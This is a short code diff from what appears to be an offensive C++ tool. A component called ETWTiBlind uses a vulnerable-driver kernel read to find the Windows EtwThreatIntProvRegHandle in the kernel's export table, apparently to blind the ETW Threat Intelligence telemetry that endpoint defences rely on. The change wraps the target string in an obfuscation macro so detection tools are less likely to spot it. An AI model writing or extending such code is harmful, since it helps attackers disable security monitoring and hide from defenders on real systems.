@@ -51,8 +51,9 @@ DWORD64 ETWTiBlind::FindEtwTiRegHandle(HANDLE hDev) {
     BYOVD::KernelRead(hDev, ntos + exp->AddressOfNameOrdinals,
                        ords.data(), numNames * sizeof(WORD));
 
-    const char* target = "EtwThreatIntProvRegHandle";
-    size_t tlen = strlen(target);
+    std::string targetStr = S("EtwThreatIntProvRegHandle");
+    const char* target = targetStr.c_str();
+    size_t tlen = targetStr.size();
 
     for (DWORD i = 0; i < numNames; i++) {
         // Read the name string (16 chars enough for our target)
